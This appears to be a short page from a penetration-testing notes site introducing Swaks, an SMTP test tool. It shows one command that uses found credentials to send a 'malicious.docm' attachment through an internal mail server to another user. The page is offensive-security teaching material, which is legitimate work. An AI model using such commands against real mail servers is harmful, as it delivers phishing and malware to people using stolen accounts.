---
description: Tools that are useful but do not require a full page of explanation
coverY: 0
layout:
  cover:
    visible: false
    size: full
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Miscellaneous

## Email

### Swiss Army Knife for SMTP

[Swaks](http://www.jetmore.org/john/code/swaks/) is a feature-filled, flexible, script-able, transaction-oriented SMTP test tool. Its [documentation](https://jetmore.org/john/code/swaks/latest/doc/ref.txt) provides a full feature list.

#### Sending Email

The command-line interface can be used to send email via SMTP. For this example assume that the attacker is trying to send email via the SMTP server for `@example.com` email addresses. Assume the attacker has found credentials for an account `test@example.com` (password `test`). Assuming the server is hosted at `192.168.236.199` the command to send an email with a malicious attachment to another user (`john.smith@example.com`) would be:

{% code overflow="wrap" %}
```bash
swaks --to john.smith@example.com --from test@example.com --server 192.168.236.199 --auth-user test@example.com --auth-password test --port 25 --attach malicious.docm
```
{% endcode %}
